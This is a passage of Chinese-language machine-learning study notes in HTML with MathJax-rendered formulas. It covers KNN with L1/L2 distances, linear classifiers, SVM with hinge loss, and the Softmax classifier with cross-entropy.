RNN名字这么像</p>\n<p>训练过程：把所有大量图片存下来</p>\n<p>预测过程：把带预测图片依次和所有存下来的图片对比，计算每一个像素的绝对差值并求和，越小表示越近。取最近的K个样本，进行<em>投票</em>。</p>\n<p>训练很快、预测很慢 ❌</p>\n<p>L1 距离就是曼哈顿距离（直角转弯的距离）</p>\n<p>L2 距离就是欧氏距离（走直线的距离）</p>\n<h2 id=\"线性分类\">线性分类</h2>\n<p>这里的线性是，线性代数的线性</p>\n<p>也就是用矩阵的方式，把所有分类过程抽象成 <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"18.094ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 7997.7 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D453\" d=\"M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(550,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(939,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1511,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1955.7,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3003.7,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3670.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4726.2,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5774.2,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6568.4,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(7568.7,0)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g></g></svg></mjx-container></span>\n可以理解成在高维空间中画了一个高维切面，把图像分到不同区域里。</p>\n<h1 id=\"损失函数和优化\">损失函数和优化</h1>\n<h2 id=\"svm分类器\">SVM分类器</h2>\n<p>支持向量机，简单来说目标是让分类结果相差越远越好。</p>\n<p>更数学一点，空间中有n种类别的点，每个类别的点不止一个。</p>\n<p>一个面把空间分成了n份，每份空间中只有一个类别的点。显然，这样的面不止一种。</p>\n<p>SVM的目标，不仅是找到一个这样的面，还要让每份空间中的点到这个面的距离尽量远。（也就是区分度更大）</p>\n<p>再具体一点，希望让 <strong>每个类别中距离面最近的点</strong>\n到面的距离最远。</p>\n<p>感觉上，好像是这些距离面最近的点把这个面 <em>支撑</em>\n了起来，所以叫做支持向量机 （Support Vector Machine）</p>\n<p>模型预测结果得到的是一个 score 向量，score[i] 表示这个输入是第 i\n个标签的得分有多高，越高可能性越大。</p>\n<p>SVM 的目标是让正确类别的score和错误类别的score相差尽量大。</p>\n<p>常用的损失函数是 Hinge Loss 合页损失。</p>\n<p><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"34.426ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 15216.1 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(958.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2014.6,0)\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2892.6,0)\"><path data-c=\"1D44E\" d=\"M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3421.6,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3993.6,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(4382.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4882.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5327.2,0)\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5796.2,0)\"><path data-c=\"1D450\" d=\"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(6229.2,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(6714.2,0)\"><path data-c=\"1D45F\" d=\"M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(7165.2,0)\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(7631.2,0)\"><path data-c=\"5B\" d=\"M118 -250V750H255V710H158V-210H255V-250H118Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(7909.2,0)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8254.2,0)\"><path data-c=\"5D\" d=\"M22 710V750H159V-250H22V-210H119V710H22Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8754.4,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(9754.7,0)\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(10223.7,0)\"><path data-c=\"1D450\" d=\"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(10656.7,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(11141.7,0)\"><path data-c=\"1D45F\" d=\"M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(11592.7,0)\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(12058.7,0)\"><path data-c=\"5B\" d=\"M118 -250V750H255V710H158V-210H255V-250H118Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(12336.7,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(12826.7,0)\"><path data-c=\"5D\" d=\"M22 710V750H159V-250H22V-210H119V710H22Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(13326.9,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(14327.1,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(14827.1,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> .</p>\n<p>简单来说，如果正确类别的score大于错误类别1分，loss 就为0.</p>\n<h2 id=\"softmax分类器\">Softmax分类器</h2>\n<p>概率最大化。</p>\n<p>和SVM一样计算出每个类别的得分，之后用Softmax计算出置信度，将得分转换为输出类别的概率。</p>\n<p>目标是让置信度最大化。</p>\n<p>损失函数计算的是交叉熵。</p>\n<p>Softmax 是将打分变成概率：</p>\n<p><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -1.307ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"20.623ex\" height=\"3.453ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -948.8 9115.3 1526.4\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mtext\"><path data-c=\"53\" d=\"M55 507Q55 590 112 647T243 704H257Q342 704 405 641L426 672Q431 679 436 687T446 700L449 704Q450 704 453 704T459 705H463Q466 705 472 699V462L466 456H448Q437 456 435 459T430 479Q413 605 329 646Q292 662 254 662Q201 662 168 626T135 542Q135 508 152 480T200 435Q210 431 286 412T370 389Q427 367 463 314T500 191Q500 110 448 45T301 -21Q245 -21 201 -4T140 27L122 41Q118 36 107 21T87 -7T78 -21Q76 -22 68 -22H64Q61 -22 55 -16V101Q55 220 56 222Q58 227 76 227H89Q95 221 95 214Q95 182 105 151T139 90T205 42T305 24Q352 24 386 62T420 155Q420 198 398 233T340 281Q284 295 266 300Q261 301 239 306T206 314T174 325T141 343T112 367T85 402Q55 451 55 507Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(556,0)\"/><path data-c=\"66\" d=\"M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z\" transform=\"translate(1056,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(1362,0)\"/><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(1751,0)\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(2584,0)\"/><path data-c=\"78\" d=\"M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 